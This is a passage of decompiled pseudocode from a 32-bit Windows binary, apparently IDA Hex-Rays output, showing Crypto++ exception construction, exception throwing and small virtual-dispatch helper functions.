  void *v34[4]; // [esp+94h] [ebp-2Ch] BYREF
  int v35; // [esp+A4h] [ebp-1Ch]
  unsigned int v36; // [esp+A8h] [ebp-18h]
  const char *v37; // [esp+ACh] [ebp-14h]
  int v38; // [esp+B0h] [ebp-10h]
  int v39; // [esp+BCh] [ebp-4h]

  v33 = (int)this;
  v31 = a4;
  v32 = a3;
  v38 = 0;
  v37 = (const char *)__std_type_info_name(a4 + 4, &stru_4F0838);
  v4 = (const char *)__std_type_info_name(a3 + 4, &stru_4F0838);
  v39 = 0;
  v20 = a2[4] + 35;
  v35 = 0;
  v36 = 15;
  LOBYTE(v34[0]) = 0;
  v38 = 1;
  sub_4196B0(v34, v20);
  sub_4198A0((char *)v34, "NameValuePairs: type mismatch for '");
  sub_419910((char *)v34, a2);
  LOBYTE(v39) = 1;
  v5 = sub_4198A0((char *)v34, "', stored '");
  v22 = 0i64;
  v38 = 3;
  v21 = *(_OWORD *)v5;
  v22 = *((_QWORD *)v5 + 2);
  v5[4] = 0;
  v5[5] = (void *)15;
  *(_BYTE *)v5 = 0;
  LOBYTE(v39) = 2;
  v6 = sub_4198A0((char *)&v21, v4);
  v24 = 0i64;
  v38 = 7;
  v23 = *(_OWORD *)v6;
  v24 = *((_QWORD *)v6 + 2);
  v6[4] = 0;
  v6[5] = (void *)15;
  *(_BYTE *)v6 = 0;
  LOBYTE(v39) = 3;
  v7 = sub_4198A0((char *)&v23, "', trying to retrieve '");
  v26 = 0i64;
  v25 = *(_OWORD *)v7;
  v26 = *((_QWORD *)v7 + 2);
  v7[4] = 0;
  v7[5] = (void *)15;
  *(_BYTE *)v7 = 0;
  v38 = 15;
  LOBYTE(v39) = 4;
  v8 = sub_4198A0((char *)&v25, v37);
  v28 = 0i64;
  v38 = 31;
  v27 = *(_OWORD *)v8;
  v28 = *((_QWORD *)v8 + 2);
  v8[4] = 0;
  v8[5] = (void *)15;
  *(_BYTE *)v8 = 0;
  LOBYTE(v39) = 5;
  v9 = sub_4198A0((char *)&v27, "'");
  v10 = v33;
  v30 = 0i64;
  v11 = *(_OWORD *)v9;
  v38 = 63;
  v29 = v11;
  *(_QWORD *)&v11 = *((_QWORD *)v9 + 2);
  v9[4] = 0;
  v9[5] = (void *)15;
  v30 = v11;
  *(_BYTE *)v9 = 0;
  *(_DWORD *)v10 = &std::exception::`vftable';
  *(_QWORD *)(v10 + 4) = 0i64;
  LOBYTE(v39) = 6;
  *(_DWORD *)v10 = &CryptoPP::Exception::`vftable';
  *(_DWORD *)(v10 + 12) = 1;
  sub_419BE0((_DWORD *)(v10 + 16), &v29);
  *(_DWORD *)v10 = &CryptoPP::InvalidArgument::`vftable';
  v38 = 31;
  LOBYTE(v39) = 10;
  if ( HIDWORD(v30) >= 0x10 )
  {
    v12 = (void *)v29;
    if ( (unsigned int)(HIDWORD(v30) + 1) >= 0x1000 )
    {
      v12 = *(void **)(v29 - 4);
      if ( (unsigned int)(v29 - (_DWORD)v12 - 4) > 0x1F )
        _invalid_parameter_noinfo_noreturn();
    }
    sub_46C87D(v12);
  }
  v30 = 0xF00000000i64;
  LOBYTE(v29) = 0;
  v38 = 15;
  LOBYTE(v39) = 11;
  if ( HIDWORD(v28) >= 0x10 )
  {
    v13 = (void *)v27;
    if ( (unsigned int)(HIDWORD(v28) + 1) >= 0x1000 )
    {
      v13 = *(void **)(v27 - 4);
      if ( (unsigned int)(v27 - (_DWORD)v13 - 4) > 0x1F )
        _invalid_parameter_noinfo_noreturn();
    }
    sub_46C87D(v13);
  }
  v28 = 0xF00000000i64;
  LOBYTE(v27) = 0;
  v38 = 7;
  LOBYTE(v39) = 12;
  if ( HIDWORD(v26) >= 0x10 )
  {
    v14 = (void *)v25;
    if ( (unsigned int)(HIDWORD(v26) + 1) >= 0x1000 )
    {
      v14 = *(void **)(v25 - 4);
      if ( (unsigned int)(v25 - (_DWORD)v14 - 4) > 0x1F )
        _invalid_parameter_noinfo_noreturn();
    }
    sub_46C87D(v14);
  }
  v26 = 0xF00000000i64;
  LOBYTE(v25) = 0;
  v38 = 3;
  LOBYTE(v39) = 13;
  if ( HIDWORD(v24) >= 0x10 )
  {
    v15 = (void *)v23;
    if ( (unsigned int)(HIDWORD(v24) + 1) >= 0x1000 )
    {
      v15 = *(void **)(v23 - 4);
      if ( (unsigned int)(v23 - (_DWORD)v15 - 4) > 0x1F )
        _invalid_parameter_noinfo_noreturn();
    }
    sub_46C87D(v15);
  }
  v24 = 0xF00000000i64;
  LOBYTE(v23) = 0;
  v38 = 1;
  LOBYTE(v39) = 14;
  if ( HIDWORD(v22) >= 0x10 )
  {
    v16 = (void *)v21;
    if ( (unsigned int)(HIDWORD(v22) + 1) >= 0x1000 )
    {
      v16 = *(void **)(v21 - 4);
      if ( (unsigned int)(v21 - (_DWORD)v16 - 4) > 0x1F )
        _invalid_parameter_noinfo_noreturn();
    }
    sub_46C87D(v16);
  }
  v22 = 0xF00000000i64;
  LOBYTE(v21) = 0;
  v38 = 0;
  LOBYTE(v39) = 15;
  if ( v36 >= 0x10 )
  {
    v17 = v34[0];
    if ( v36 + 1 >= 0x1000 )
    {
      v17 = (void *)*((_DWORD *)v34[0] - 1);
      if ( (unsigned int)(v34[0] - v17 - 4) > 0x1F )
        _invalid_parameter_noinfo_noreturn();
    }
    sub_46C87D(v17);
  }
  *(_DWORD *)(v10 + 40) = v32;
  v18 = v31;
  v35 = 0;
  v36 = 15;
  LOBYTE(v34[0]) = 0;
  *(_DWORD *)v10 = &CryptoPP::NameValuePairs::ValueTypeMismatch::`vftable';
  *(_DWORD *)(v10 + 44) = v18;
  v39 = -1;
  return v10;
}
// 48388B: using guessed type _DWORD __cdecl __std_type_info_name(_DWORD, PSLIST_HEADER ListHead);
// 4B83A4: using guessed type void *std::exception::`vftable';
// 4B8910: using guessed type void *CryptoPP::Exception::`vftable';
// 4B891C: using guessed type void *CryptoPP::InvalidArgument::`vftable';
// 4B9200: using guessed type void *CryptoPP::NameValuePairs::ValueTypeMismatch::`vftable';

//----- (004059C0) --------------------------------------------------------
int __cdecl sub_4059C0(void *a1, int a2, int a3)
{
  int result; // eax
  char pExceptionObject[48]; // [esp+10h] [ebp-54h] BYREF
  _DWORD v5[9]; // [esp+40h] [ebp-24h] BYREF

  result = __std_type_info_compare(a2 + 4, a3 + 4);
  if ( result )
  {
    sub_419B80((int)v5, a1);
    v5[8] = 0;
    sub_4054F0(pExceptionObject, v5, a2, a3);
    _CxxThrowException(pExceptionObject, (_ThrowInfo *)&_TI4_AVValueTypeMismatch_NameValuePairs_CryptoPP__);
  }
  return result;
}
// 48384F: using guessed type _DWORD __cdecl __std_type_info_compare(_DWORD, _DWORD);

//----- (00405A50) --------------------------------------------------------
_DWORD *__thiscall sub_405A50(_DWORD *this, char a2)
{
  *this = &CryptoPP::NameValuePairs::`vftable';
  if ( (a2 & 1) != 0 )
    sub_46C87D(this);
  return this;
}
// 4B91D0: using guessed type void *CryptoPP::NameValuePairs::`vftable';

//----- (00405A80) --------------------------------------------------------
_DWORD *__thiscall sub_405A80(_DWORD *this, char a2)
{
  sub_4050D0(this);
  if ( (a2 & 1) != 0 )
    sub_46C87D(this);
  return this;
}

//----- (00405AE0) --------------------------------------------------------
int __thiscall sub_405AE0(_DWORD *this)
{
  return sub_4050D0(this);
}

//----- (00405B30) --------------------------------------------------------
char *__thiscall sub_405B30(char *this, _DWORD *a2)
{
  *(_DWORD *)this = &std::exception::`vftable';
  *(_QWORD *)(this + 4) = 0i64;
  __std_exception_copy(a2 + 1, this + 4);
  *(_DWORD *)this = &CryptoPP::Exception::`vftable';
  *((_DWORD *)this + 3) = a2[3];
  sub_419BE0((_DWORD *)this + 4, a2 + 4);
  *(_DWORD *)this = &CryptoPP::InvalidArgument::`vftable';
  *(_DWORD *)this = &CryptoPP::NameValuePairs::ValueTypeMismatch::`vftable';
  *((_DWORD *)this + 10) = a2[10];
  *((_DWORD *)this + 11) = a2[11];
  return this;
}
// 4837C4: using guessed type _DWORD __cdecl __std_exception_copy(_DWORD, _DWORD);
// 4B83A4: using guessed type void *std::exception::`vftable';
// 4B8910: using guessed type void *CryptoPP::Exception::`vftable';
// 4B891C: using guessed type void *CryptoPP::InvalidArgument::`vftable';
// 4B9200: using guessed type void *CryptoPP::NameValuePairs::ValueTypeMismatch::`vftable';

//----- (00405BE0) --------------------------------------------------------
char *__thiscall sub_405BE0(char *this, int a2)
{
  *(_DWORD *)this = &std::exception::`vftable';
  *(_QWORD *)(this + 4) = 0i64;
  __std_exception_copy(a2 + 4, this + 4);
  *(_DWORD *)this = &CryptoPP::Exception::`vftable';
  *((_DWORD *)this + 3) = *(_DWORD *)(a2 + 12);
  sub_419BE0((_DWORD *)this + 4, (_DWORD *)(a2 + 16));
  *(_DWORD *)this = &CryptoPP::InvalidArgument::`vftable';
  return this;
}
// 4837C4: using guessed type _DWORD __cdecl __std_exception_copy(_DWORD, _DWORD);
// 4B83A4: using guessed type void *std::exception::`vftable';
// 4B8910: using guessed type void *CryptoPP::Exception::`vftable';
// 4B891C: using guessed type void *CryptoPP::InvalidArgument::`vftable';

//----- (00405C80) --------------------------------------------------------
char *__thiscall sub_405C80(char *this, int a2)
{
  *(_DWORD *)this = &std::exception::`vftable';
  *(_QWORD *)(this + 4) = 0i64;
  __std_exception_copy(a2 + 4, this + 4);
  *(_DWORD *)this = &CryptoPP::Exception::`vftable';
  *((_DWORD *)this + 3) = *(_DWORD *)(a2 + 12);
  sub_419BE0((_DWORD *)this + 4, (_DWORD *)(a2 + 16));
  return this;
}
// 4837C4: using guessed type _DWORD __cdecl __std_exception_copy(_DWORD, _DWORD);
// 4B83A4: using guessed type void *std::exception::`vftable';
// 4B8910: using guessed type void *CryptoPP::Exception::`vftable';

//----- (00405D10) --------------------------------------------------------
void __noreturn sub_405D10()
{
  char pExceptionObject[40]; // [esp+4h] [ebp-4Ch] BYREF
  _DWORD v1[9]; // [esp+2Ch] [ebp-24h] BYREF

  sub_419B80((int)v1, "Clone() is not implemented yet.");
  v1[8] = 0;
  sub_4053E0(pExceptionObject, v1);
  _CxxThrowException(pExceptionObject, (_ThrowInfo *)&_TI3_AVNotImplemented_CryptoPP__);
}
// 405D10: using guessed type void __noreturn sub_405D10();

//----- (00405D70) --------------------------------------------------------
char *__thiscall sub_405D70(char *this, int a2)
{
  *(_DWORD *)this = &std::exception::`vftable';
  *(_QWORD *)(this + 4) = 0i64;
  __std_exception_copy(a2 + 4, this + 4);
  *(_DWORD *)this = &CryptoPP::Exception::`vftable';
  *((_DWORD *)this + 3) = *(_DWORD *)(a2 + 12);
  sub_419BE0((_DWORD *)this + 4, (_DWORD *)(a2 + 16));
  *(_DWORD *)this = &CryptoPP::NotImplemented::`vftable';
  return this;
}
// 4837C4: using guessed type _DWORD __cdecl __std_exception_copy(_DWORD, _DWORD);
// 4B83A4: using guessed type void *std::exception::`vftable';
// 4B8910: using guessed type void *CryptoPP::Exception::`vftable';
// 4B8928: using guessed type void *CryptoPP::NotImplemented::`vftable';

//----- (00405E10) --------------------------------------------------------
int __stdcall sub_405E10(int a1)
{
  *(_DWORD *)(a1 + 16) = 0;
  *(_DWORD *)(a1 + 20) = 15;
  *(_BYTE *)a1 = 0;
  sub_41EF80((void **)a1, "unknown", 7u);
  return a1;
}

//----- (00405E80) --------------------------------------------------------
int __stdcall sub_405E80(int a1)
{
  *(_DWORD *)(a1 + 16) = 0;
  *(_DWORD *)(a1 + 20) = 15;
  *(_BYTE *)a1 = 0;
  sub_41EF80((void **)a1, "C++", 3u);
  return a1;
}

//----- (00405EF0) --------------------------------------------------------
bool __thiscall sub_405EF0(void *this, int a2)
{
  return a2 == (*(int (__thiscall **)(void *, int))(*(_DWORD *)this + 16))(this, a2);
}

//----- (00405F10) --------------------------------------------------------
int __thiscall sub_405F10(void *this)
{
  return (*(int (__thiscall **)(void *))(*(_DWORD *)this + 32))(this);
}

//----- (00405F20) --------------------------------------------------------
void __thiscall __noreturn sub_405F20(void *this, int a2, int a3)
{
  int v3; // eax
  char *v4; // eax
  _DWORD *v5; // eax
  char v6[24]; // [esp+4h] [ebp-64h] BYREF
  char v7[24]; // [esp+1Ch] [ebp-4Ch] BYREF
  char pExceptionObject[40]; // [esp+34h] [ebp-34h] BYREF
  int v9; // [esp+64h] [ebp-4h]

  v3 = (*(int (__thiscall **)(void *))(*(_DWORD *)this + 52))(this);
  v4 = (char *)(*(int (__thiscall **)(int, char *))(*(_DWORD *)v3 + 8))(v3, v7);
  v9 = 0;
  v5 = (_DWORD *)sub_421F20((int)v6, v4, ": this object doesn't support resynchronization");
  LOBYTE(v9) = 1;
  sub_4053E0(pExceptionObject, v5);
  _CxxThrowException(pExceptionObject, (_ThrowInfo *)&_TI3_AVNotImplemented_CryptoPP__);
}
// 405F20: using guessed type char var_4C[24];
// 405F20: using guessed type char var_64[24];

//----- (00405F90) --------------------------------------------------------
char sub_405F90()
{
  return 1;
}

//----- (00405FA0) --------------------------------------------------------
int __thiscall sub_405FA0(void *this)
{
  return (*(int (__thiscall **)(void *))(*(_DWORD *)this + 16))(this);
}

//----- (00405FB0) --------------------------------------------------------
void __noreturn sub_405FB0()
{
  char pExceptionObject[40]; // [esp+4h] [ebp-4Ch] BYREF
  _DWORD v1[9]; // [esp+2Ch] [ebp-24h] BYREF

  sub_419B80((int)v1, "StreamTransformation: this object doesn't support random access");
  v1[8] = 0;
  sub_4053E0(pExceptionObject, v1);
  _CxxThrowException(pExceptionObject, (_ThrowInfo *)&_TI3_AVNotImplemented_CryptoPP__);
}
// 405FB0: using guessed type void __noreturn sub_405FB0();

//----- (00406010) --------------------------------------------------------
int __stdcall sub_406010(_DWORD *a1)
{
  *a1 = 0;
  return 0;
}

//----- (00406030) --------------------------------------------------------
int __thiscall sub_406030(int *this, int a2)
{
  int v3; // esi
  int v4; // eax

  v3 = *this;
  v4 = (*(int (__thiscall **)(int *))(*this + 32))(this);
  return (*(int (__thiscall **)(int *, int, int))(v3 + 60))(this, a2, v4);
}

//----- (00406050) --------------------------------------------------------
int __thiscall sub_406050(void *this, int a2, int a3, int a4)
{
  (*(void (__thiscall **)(void *, int, int))(*(_DWORD *)this + 16))(this, a3, a4);
  return (*(int (__thiscall **)(void *, int))(*(_DWORD *)this + 24))(this, a2);
}

//----- (00406070) --------------------------------------------------------
int __thiscall sub_406070(int *this, int a2)
{
  int v3; // esi
  int v4; // eax

  v3 = *this;
  v4 = (*(int (__thiscall **)(int *))(*this + 32))(this);
  return (*(int (__thiscall **)(int *, int, int))(v3 + 68))(this, a2, v4);
}

//----- (00406090) --------------------------------------------------------
int __thiscall sub_406090(void *this, int a2, int a3, int a4)
{
  (*(void (__thiscall **)(void *, int, int))(*(_DWORD *)this + 16))(this, a3, a4);
  return (*(int (__thiscall **)(void *, int))(*(_DWORD *)this + 52))(this, a2);
}

//----- (004060C0) --------------------------------------------------------
int __thiscall sub_4060C0(void *this, int a2, int a3, int a4, int a5)
{
  (*(void (__thiscall **)(void *, int, int))(*(_DWORD *)this + 16))(this, a4, a5);
  return (*(int (__thiscall **)(void *, int, int))(*(_DWORD *)this + 60))(this, a2, a3);
}

//----- (004060F0) --------------------------------------------------------
int __thiscall sub_4060F0(void *this, int a2, int a3, int a4, int a5)
{
  (*(void (__thiscall **)(void *, int, int))(*(_DWORD *)this + 16))(this, a4, a5);
  return (*(int (__thiscall **)(void *, int, int))(*(_DWORD *)this + 68))(this, a2, a3);
}

//----- (00406120) --------------------------------------------------------
char *__thiscall sub_406120(char *this)
{
  return this + 4;
}

//----- (00406130) --------------------------------------------------------
__int64 sub_406130()
{
  return 0i64;
}

//----- (00406150) --------------------------------------------------------
void __noreturn sub_406150()
{
  char pExceptionObject[40]; // [esp+4h] [ebp-4Ch] BYREF
  _DWORD v1[9]; // [esp+2Ch] [ebp-24h] BYREF

  sub_419B80((int)v1, "RandomNumberGenerator: IncorporateEntropy not implemented");
  v1[8] = 0;
  sub_4053E0(pExceptionObject, v1);
  _CxxThrowException(pExceptionObject, (_ThrowInfo *)&_TI3_AVNotImplemented_CryptoPP__);
}
// 406150: using guessed type void __noreturn sub_406150();

//----- (004061B0) --------------------------------------------------------
int __thiscall sub_4061B0(void *this)
{
  return (*(int (__thiscall **)(void *))(*(_DWORD *)this + 24))(this);
}

//----- (004061C0) --------------------------------------------------------
char __stdcall sub_4061C0(int a1)
{
  return 0;
}

//----- (004061E0) --------------------------------------------------------
int __thiscall sub_4061E0(void *this)
{
  return (*(int (__thiscall **)(void *))(*(_DWORD *)this + 96))(this);
}

//----- (004061F0) --------------------------------------------------------
int __thiscall sub_4061F0(void *this)
{
  return (*(int (__thiscall **)(void *))(*(_DWORD *)this + 168))(this);
}

//----- (00406200) --------------------------------------------------------
void __noreturn sub_406200()
{
  char pExceptionObject[40]; // [esp+4h] [ebp-4Ch] BYREF
  _DWORD v1[9]; // [esp+2Ch] [ebp-24h] BYREF

  sub_419B80((int)v1, "BufferedTransformation: this object is not attachable");
  v1[8] = 0;
  sub_4053E0(pExceptionObject, v1);
  _CxxThrowException(pExceptionObject, (_ThrowInfo *)&_TI3_AVNotImplemented_CryptoPP__);
}
// 406200: using guessed type void __noreturn sub_406200();

//----- (00406260) --------------------------------------------------------
char *__thiscall sub_406260(char *this, _DWORD *a2)
{
  *(_DWORD *)this = &std::exception::`vftable';
  *(_QWORD *)(this + 4) = 0i64;
  *(_DWORD *)this = &CryptoPP::Exception::`vftable';
  *((_DWORD *)this + 3) = 4;
  sub_419BE0((_DWORD *)this + 4, a2);
  *(_DWORD *)this = &CryptoPP::InvalidDataFormat::`vftable';
  *(_DWORD *)this = &CryptoPP::CryptoMaterial::InvalidMaterial::`vftable';
  return this;
}
// 4B83A4: using guessed type void *std::exception::`vftable';
// 4B8910: using guessed type void *CryptoPP::Exception::`vftable';
// 4B91DC: using guessed type void *CryptoPP::InvalidDataFormat::`vftable';
// 4BA1B4: using guessed type void *CryptoPP::CryptoMaterial::InvalidMaterial::`vftable';

//----- (004062F0) --------------------------------------------------------
void __thiscall sub_4062F0(_DWORD *this)
{
  *this = &CryptoPP::NameValuePairs::`vftable';
}
// 4B91D0: using guessed type void *CryptoPP::NameValuePairs::`vftable';

//----- (00406340) --------------------------------------------------------
int __thiscall sub_406340(void *this, int a2, int a3)
{
  int result; // eax
  char pExceptionObject[40]; // [esp+4h] [ebp-4Ch] BYREF
  _DWORD v5[9]; // [esp+2Ch] [ebp-24h] BYREF

  result = (*(int (__thiscall **)(void *, int, int))(*(_DWORD *)this + 12))(this, a2, a3);
  if ( !(_BYTE)result )
  {
    sub_419B80((int)v5, "CryptoMaterial: this object contains invalid values");
    v5[8] = 0;
    sub_406260(pExceptionObject, v5);
    _CxxThrowException(pExceptionObject, (_ThrowInfo *)&_TI4_AVInvalidMaterial_CryptoMaterial_CryptoPP__);
  }
  return result;
}

//----- (004063C0) --------------------------------------------------------
void __noreturn sub_4063C0()
{
  char pExceptionObject[40]; // [esp+4h] [ebp-4Ch] BYREF
  _DWORD v1[9]; // [esp+2Ch] [ebp-24h] BYREF

  sub_419B80((int)v1, "CryptoMaterial: this object does not support precomputation");
  v1[8] = 0;
  sub_4053E0(pExceptionObject, v1);
  _CxxThrowException(pExceptionObject, (_ThrowInfo *)&_TI3_AVNotImplemented_CryptoPP__);
}
// 4063C0: using guessed type void __noreturn sub_4063C0();

//----- (00406420) --------------------------------------------------------
_DWORD *__thiscall sub_406420(_DWORD *this, char a2)
{
  sub_4050D0(this);
  if ( (a2 & 1) != 0 )
    sub_46C87D(this);
  return this;
}

//----- (00406480) --------------------------------------------------------
char *__thiscall sub_406480(char *this, int a2)
{
  *(_DWORD *)this = &std::exception::`vftable';
  *(_QWORD *)(this + 4) = 0i64;
  __std_exception_copy(a2 + 4, this + 4);
  *(_DWORD *)this = &CryptoPP::Exception::`vftable';
  *((_DWORD *)this + 3) = *(_DWORD *)(a2 + 12);
  sub_419BE0((_DWORD *)this + 4, (_DWORD *)(a2 + 16));
  *(_DWORD *)this = &CryptoPP::InvalidDataFormat::`vftable';
  *(_DWORD *)this = &CryptoPP::CryptoMaterial::InvalidMaterial::`vftable';
  return this;
}
// 4837C4: using guessed type _DWORD __cdecl __std_exception_copy(_DWORD, _DWORD);
// 4B83A4: using guessed type void *std::exception::`vftable';
// 4B8910: using guessed type void *CryptoPP::Exception::`vftable';
// 4B91DC: using guessed type void *CryptoPP::InvalidDataFormat::`vftable';
// 4BA1B4: using guessed type void *CryptoPP::CryptoMaterial::InvalidMaterial::`vftable';

//----- (00406520) --------------------------------------------------------
char *__thiscall sub_406520(char *this, int a2)
{
  *(_DWORD *)this = &std::exception::`vftable';
  *(_QWORD *)(this + 4) = 0i64;
  __std_exception_copy(a2 + 4, this + 4);
  *(_DWORD *)this = &CryptoPP::Exception::`vftable';
  *((_DWORD *)this + 3) = *(_DWORD *)(a2 + 12);
  sub_419BE0((_DWORD *)this + 4, (_DWORD *)(a2 + 16));
  *(_DWORD *)this = &CryptoPP::InvalidDataFormat::`vftable';
  return this;
}
// 4837C4: using guessed type _DWORD __cdecl __std_exception_copy(_DWORD, _DWORD);
// 4B83A4: using guessed type void *std::exception::`vftable';
// 4B8910: using guessed type void *CryptoPP::Exception::`vftable';
// 4B91DC: using guessed type void *CryptoPP::InvalidDataFormat::`vftable';

//----- (004065C0) --------------------------------------------------------
void __cdecl __noreturn sub_4065C0(int a1, int a2)
{
  char pExceptionObject[40]; // [esp+4h] [ebp-4Ch] BYREF
  _DWORD v3[9]; // [esp+2Ch] [ebp-24h] BYREF

  sub_419B80((int)v3, "GeneratableCryptoMaterial: this object does not support key/parameter generation");
  v3[8] = 0;
  sub_4053E0(pExceptionObject, v3);
  _CxxThrowException(pExceptionObject, (_ThrowInfo *)&_TI3_AVNotImplemented_CryptoPP__);
}

//----- (00406620) --------------------------------------------------------
int __thiscall sub_406620(void *this)
{
  int v1; // edx

  v1 = (*(int (__thiscall **)(void *))(*(_DWORD *)this + 24))(this);
  return v1 + *(_DWORD *)(*(_DWORD *)v1 + 4);
}

//----- (00406630) --------------------------------------------------------
int __thiscall sub_406630(void *this)
{
  int v1; // edx

  v1 = (*(int (__thiscall **)(void *))(*(_DWORD *)this + 28))(this);
  return v1 + *(_DWORD *)(*(_DWORD *)v1 + 4);
}

//----- (00406640) --------------------------------------------------------
int __thiscall sub_406640(void *this)
{
  return (*(int (__thiscall **)(void *))(*(_DWORD *)this + 8))(this);
}

//----- (00406650) --------------------------------------------------------
int __thiscall sub_406650(_BYTE *this)
{
  int v1; // eax

  v1 = *(_DWORD *)this;
  this[16] = 0;
  return (*(int (**)(void))(v1 + 180))();
}

//----- (00406660) --------------------------------------------------------
BOOL __thiscall sub_406660(_BYTE *this)
{
  return this[16] == 0;
}

//----- (00406670) --------------------------------------------------------
int __stdcall sub_406670(int a1, _DWORD *a2, int a3, int a4)
{
  *a2 = 0;
  a2[1] = 0;
  return 0;
}

//----- (00406690) --------------------------------------------------------
int __stdcall sub_406690(int a1, int a2, int a3, int a4, int a5, int a6)
{
  return 0;
}

//----- (004066A0) --------------------------------------------------------
void __thiscall sub_4066A0(int this)
{
  unsigned int v1; // edx
  void *v2; // esi

  v1 = *(_DWORD *)(this + 12);
  v2 = *(void **)(this + 16);
  if ( *(_DWORD *)(this + 8) < v1 )
    v1 = *(_DWORD *)(this + 8);
  memset(*(void **)(this + 16), 0, 4 * v1);
  if ( v1 )
    j_j_unknown_libname_61(v2);
  else
    j_j___free_base(v2);
}
// 45AC70: using guessed type _DWORD __cdecl j_j_unknown_libname_61(_DWORD);

//----- (00406720) --------------------------------------------------------
int __userpurge sub_406720@<eax>(int a1@<ecx>, int a2@<ebp>, const char *a3)
{
  void **v4; // eax
  void **v5; // eax
  __int64 v6; // xmm0_8
  void *v7; // ecx
  void *v8; // ecx
  void *v9; // ecx
  __int128 v11; // [esp-5Ch] [ebp-68h] BYREF
  __int64 v12; // [esp-4Ch] [ebp-58h]
  __int128 v13; // [esp-44h] [ebp-50h] BYREF
  __int64 v14; // [esp-34h] [ebp-40h]
  void *v15[4]; // [esp-2Ch] [ebp-38h] BYREF
  int v16; // [esp-1Ch] [ebp-28h]
  unsigned int v17; // [esp-18h] [ebp-24h]
  int v18; // [esp-14h] [ebp-20h]
  int *v19; // [esp-10h] [ebp-1Ch]
  struct _EXCEPTION_REGISTRATION_RECORD *ExceptionList; // [esp-Ch] [ebp-18h]
  void *v21; // [esp-8h] [ebp-14h]
  int v22; // [esp-4h] [ebp-10h]
  int v23; // [esp+0h] [ebp-Ch]
  int v24; // [esp+4h] [ebp-8h]
  int v25; // [esp+8h] [ebp-4h] BYREF
  int retaddr; // [esp+Ch] [ebp+0h]

  v23 = a2;
  v24 = retaddr;
  v22 = -1;
  v21 = &loc_4AC175;
  ExceptionList = NtCurrentTeb()->NtTib.ExceptionList;
  v19 = &v25;
  v18 = 0;
  v16 = 0;
  v17 = 15;
  LOBYTE(v15[0]) = 0;
  sub_41EF80(v15, "AlgorithmParametersBase: parameter \"", 0x24u);
  v22 = 1;
  v4 = sub_4198A0((char *)v15, a3);
  v12 = 0i64;
  v18 = 1;
  v11 = *(_OWORD *)v4;
  v12 = *((_QWORD *)v4 + 2);
  v4[4] = 0;
  v4[5] = (void *)15;
  *(_BYTE *)v4 = 0;
  LOBYTE(v22) = 2;
  v5 = sub_4198A0((char *)&v11, "\" not used");
  v14 = 0i64;
  v18 = 3;
  v13 = *(_OWORD *)v5;
  v6 = *((_QWORD *)v5 + 2);
  v5[4] = 0;
  v5[5] = (void *)15;
  v14 = v6;
  *(_BYTE *)v5 = 0;
  *(_DWORD *)a1 = &std::exception::`vftable';
  *(_QWORD *)(a1 + 4) = 0i64;
  LOBYTE(v22) = 3;
  *(_DWORD *)a1 = &CryptoPP::Exception::`vftable';
  *(_DWORD *)(a1 + 12) = 6;
  sub_419BE0((_DWORD *)(a1 + 16), &v13);
  v18 = 1;
  LOBYTE(v22) = 6;
  if ( HIDWORD(v14) >= 0x10 )
  {
    v7 = (void *)v13;
    if ( (unsigned int)(HIDWORD(v14) + 1) >= 0x1000 )
    {
      v7 = *(void **)(v13 - 4);
      if ( (unsigned int)(v13 - (_DWORD)v7 - 4) > 0x1F )
        _invalid_parameter_noinfo_noreturn();
    }
    sub_46C87D(v7);
  }
  v14 = 0xF00000000i64;
  LOBYTE(v13) = 0;
  v18 = 0;
  LOBYTE(v22) = 7;
  if ( HIDWORD(v12) >= 0x10 )
  {
    v8 = (void *)v11;
    if ( (unsigned int)(HIDWORD(v12) + 1) >= 0x1000 )
    {
      v8 = *(void **)(v11 - 4);
      if ( (unsigned int)(v11 - (_DWORD)v8 - 4) > 0x1F )
        _invalid_parameter_noinfo_noreturn();
    }
    sub_46C87D(v8);
  }
  v12 = 0xF00000000i64;
  LOBYTE(v11) = 0;
  LOBYTE(v22) = 8;
  if ( v17 >= 0x10 )
  {
    v9 = v15[0];
    if ( v17 + 1 >= 0x1000 )
    {
      v9 = (void *)*((_DWORD *)v15[0] - 1);
      if ( (unsigned int)(v15[0] - v9 - 4) > 0x1F )
        _invalid_parameter_noinfo_noreturn();
    }
    sub_46C87D(v9);
  }
  v16 = 0;
  v17 = 15;
  LOBYTE(v15[0]) = 0;
  *(_DWORD *)a1 = &CryptoPP::AlgorithmParametersBase::ParameterNotUsed::`vftable';
  v22 = -1;
  return a1;
}
// 4B83A4: using guessed type void *std::exception::`vftable';
// 4B8910: using guessed type void *CryptoPP::Exception::`vftable';
// 4B9384: using guessed type void *CryptoPP::AlgorithmParametersBase::ParameterNotUsed::`vftable';

//----- (00406980) --------------------------------------------------------
int __thiscall sub_406980(const char **this)
{
  int result; // eax
  const char *v3; // ecx
  char pExceptionObject[40]; // [esp+8h] [ebp-38h] BYREF
  const char **v5; // [esp+30h] [ebp-10h]
  int v6; // [esp+3Ch] [ebp-4h]
  int savedregs; // [esp+40h] [ebp+0h] BYREF

  v5 = this;
  *this = (const char *)&CryptoPP::AlgorithmParametersBase::`vftable';
  v6 = 0;
  result = j____uncaught_exceptions();
  if ( !result && *((_BYTE *)this + 8) && !*((_BYTE *)this + 9) )
  {
    sub_406720((int)pExceptionObject, (int)&savedregs, this[1]);
    _CxxThrowException(pExceptionObject, (_ThrowInfo *)&_TI3_AVParameterNotUsed_AlgorithmParametersBase_CryptoPP__);
  }
  v6 = -1;
  v3 = this[3];
  if ( v3 )
    return (**(int (__thiscall ***)(const char *, int))v3)(v3, 1);
  return result;
}
// 469C27: using guessed type int j____uncaught_exceptions(void);
// 4B9390: using guessed type void *CryptoPP::AlgorithmParametersBase::`vftable';

//----- (00406A10) --------------------------------------------------------
const char **__thiscall sub_406A10(const char **this, char a2)
{
  sub_406980(this);
  if ( (a2 & 1) != 0 )
    sub_46C87D(this);
  return this;
}

//----- (00406A40) --------------------------------------------------------
char *__thiscall sub_406A40(char *this, int a2)
{
  *(_DWORD *)this = &std::exception::`vftable';
  *(_QWORD *)(this + 4) = 0i64;
  __std_exception_copy(a2 + 4, this + 4);
  *(_DWORD *)this = &CryptoPP::Exception::`vftable';
  *((_DWORD *)this + 3) = *(_DWORD *)(a2 + 12);
  sub_419BE0((_DWORD *)this + 4, (_DWORD *)(a2 + 16));
  *(_DWORD *)this = &CryptoPP::AlgorithmParametersBase::ParameterNotUsed::`vftable';
  return this;
}
// 4837C4: using guessed type _DWORD __cdecl __std_exception_copy(_DWORD, _DWORD);
// 4B83A4: using guessed type void *std::exception::`vftable';
// 4B8910: using guessed type void *CryptoPP::Exception::`vftable';
// 4B9384: using guessed type void *CryptoPP::AlgorithmParametersBase::ParameterNotUsed::`vftable';

//----- (00406AE0) --------------------------------------------------------
int __thiscall sub_406AE0(_DWORD *this)
{
